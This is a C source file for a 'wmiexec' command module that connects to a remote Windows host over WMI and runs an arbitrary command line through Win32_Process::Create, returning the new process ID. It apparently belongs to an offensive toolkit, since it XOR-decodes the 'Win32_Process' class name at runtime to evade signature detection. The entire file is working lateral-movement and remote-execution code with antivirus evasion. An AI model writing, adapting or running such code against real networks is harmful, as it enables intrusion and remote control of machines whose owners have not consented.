#include "commands.h"
#include "evs_strings.h"
#include <windows.h>
#include <objbase.h>
#include <wbemcli.h>
#include <oleauto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const CLSID _clsid_WbemLocator =
    {0x4590f811,0x1d3a,0x11d0,{0x89,0x1f,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
static const IID   _iid_IWbemLocator  =
    {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};

static BSTR _mbstr(const char *s)
{
    int n = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
    if (n <= 0) return NULL;
    WCHAR *ws = (WCHAR *)malloc((size_t)n * sizeof(WCHAR));
    if (!ws) return NULL;
    MultiByteToWideChar(CP_ACP, 0, s, -1, ws, n);
    BSTR b = SysAllocString(ws);
    free(ws);
    return b;
}

int cmd_wmiexec(const char *host, const char *cmdline,
                char *output_buf, size_t output_size)
{
    if (!host || !host[0] || !cmdline || !cmdline[0]) {
        snprintf(output_buf, output_size,
                 "[wmiexec] usage: wmiexec <host> <cmdline>\n");
        return -1;
    }

    HRESULT hr;
    BOOL    co_init = FALSE;
    int     rc      = -1;

    IWbemLocator    *pLoc      = NULL;
    IWbemServices   *pSvc      = NULL;
    IWbemClassObject *pClass   = NULL;
    IWbemClassObject *pInCls   = NULL;
    IWbemClassObject *pIn      = NULL;
    IWbemClassObject *pOut     = NULL;
    BSTR bNS = NULL, bCls = NULL, bMeth = NULL;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        co_init = TRUE;
    } else if (hr != RPC_E_CHANGED_MODE) {
        snprintf(output_buf, output_size,
                 "[wmiexec] CoInitializeEx: 0x%08lx\n", (unsigned long)hr);
        return -1;
    }

    CoInitializeSecurity(NULL, -1, NULL, NULL,
                         RPC_C_AUTHN_LEVEL_DEFAULT,
                         RPC_C_IMP_LEVEL_IMPERSONATE,
                         NULL, EOAC_NONE, NULL);

    hr = CoCreateInstance(&_clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &_iid_IWbemLocator, (void **)&pLoc);
    if (FAILED(hr)) {
        snprintf(output_buf, output_size,
                 "[wmiexec] CoCreateInstance: 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    char ns[320];
    snprintf(ns, sizeof(ns), "\\\\%s\\root\\cimv2", host);
    bNS = _mbstr(ns);
    if (!bNS) goto cleanup;

    hr = pLoc->lpVtbl->ConnectServer(pLoc, bNS,
                                     NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    if (FAILED(hr)) {
        snprintf(output_buf, output_size,
                 "[wmiexec] ConnectServer(%s): 0x%08lx\n",
                 host, (unsigned long)hr);
        goto cleanup;
    }

    hr = CoSetProxyBlanket((IUnknown *)pSvc,
                           RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                           RPC_C_AUTHN_LEVEL_CALL,
                           RPC_C_IMP_LEVEL_IMPERSONATE,
                           NULL, EOAC_NONE);
    if (FAILED(hr)) {
        snprintf(output_buf, output_size,
                 "[wmiexec] CoSetProxyBlanket: 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    { WCHAR _wp[14]; volatile unsigned char _k = EVS_KEY;
      for (int _i = 0; _i < (int)sizeof(EVS_str_Win32_Process); _i++)
          _wp[_i] = (WCHAR)(EVS_str_Win32_Process[_i] ^ _k);
      _wp[sizeof(EVS_str_Win32_Process)] = L'\0';
      bCls = SysAllocString(_wp);
      SecureZeroMemory(_wp, sizeof(_wp)); }
    bMeth = SysAllocString(L"Create");
    if (!bCls || !bMeth) goto cleanup;

    hr = pSvc->lpVtbl->GetObject(pSvc, bCls, 0, NULL, &pClass, NULL);
    if (FAILED(hr)) {
        snprintf(output_buf, output_size,
                 "[wmiexec] GetObject(Win32_Process): 0x%08lx\n",
                 (unsigned long)hr);
        goto cleanup;
    }

    hr = pClass->lpVtbl->GetMethod(pClass, L"Create", 0, &pInCls, NULL);
    if (FAILED(hr)) {
        snprintf(output_buf, output_size,
                 "[wmiexec] GetMethod(Create): 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    hr = pInCls->lpVtbl->SpawnInstance(pInCls, 0, &pIn);
    if (FAILED(hr)) {
        snprintf(output_buf, output_size,
                 "[wmiexec] SpawnInstance: 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    {
        BSTR bcmd = _mbstr(cmdline);
        if (!bcmd) goto cleanup;

        VARIANT v;
        VariantInit(&v);
        V_VT(&v)   = VT_BSTR;
        V_BSTR(&v) = bcmd;

        hr = pIn->lpVtbl->Put(pIn, L"CommandLine", 0, &v, 0);
        VariantClear(&v);
        if (FAILED(hr)) {
            snprintf(output_buf, output_size,
                     "[wmiexec] Put(CommandLine): 0x%08lx\n", (unsigned long)hr);
            goto cleanup;
        }
    }

    hr = pSvc->lpVtbl->ExecMethod(pSvc, bCls, bMeth, 0, NULL,
                                   pIn, &pOut, NULL);
    if (FAILED(hr)) {
        snprintf(output_buf, output_size,
                 "[wmiexec] ExecMethod: 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    {
        VARIANT vRet, vPid;
        VariantInit(&vRet); VariantInit(&vPid);
        pOut->lpVtbl->Get(pOut, L"ReturnValue", 0, &vRet, NULL, NULL);
        pOut->lpVtbl->Get(pOut, L"ProcessId",   0, &vPid, NULL, NULL);

        DWORD ret_val = (vRet.vt == VT_I4 || vRet.vt == VT_UI4)
                        ? (DWORD)vRet.intVal : 0xFFFF;
        DWORD pid_val = (vPid.vt == VT_I4 || vPid.vt == VT_UI4)
                        ? (DWORD)vPid.intVal : 0;
        VariantClear(&vRet); VariantClear(&vPid);

        if (ret_val == 0) {
            snprintf(output_buf, output_size,
                     "[wmiexec] ok  host=%s  pid=%lu\n  cmd=%s\n",
                     host, (unsigned long)pid_val, cmdline);
            rc = 0;
        } else {
            snprintf(output_buf, output_size,
                     "[wmiexec] Win32_Process::Create returned %lu\n"
                     "  2=access denied  3=insufficient priv  8=unknown\n"
                     "  9=path not found  21=invalid param\n",
                     (unsigned long)ret_val);
        }
    }

cleanup:
    if (pOut)   pOut->lpVtbl->Release(pOut);
    if (pIn)    pIn->lpVtbl->Release(pIn);
    if (pInCls) pInCls->lpVtbl->Release(pInCls);
    if (pClass) pClass->lpVtbl->Release(pClass);
    if (pSvc)   pSvc->lpVtbl->Release(pSvc);
    if (pLoc)   pLoc->lpVtbl->Release(pLoc);
    if (bNS)    SysFreeString(bNS);
    if (bCls)   SysFreeString(bCls);
    if (bMeth)  SysFreeString(bMeth);
    if (co_init) CoUninitialize();
    return rc;
}
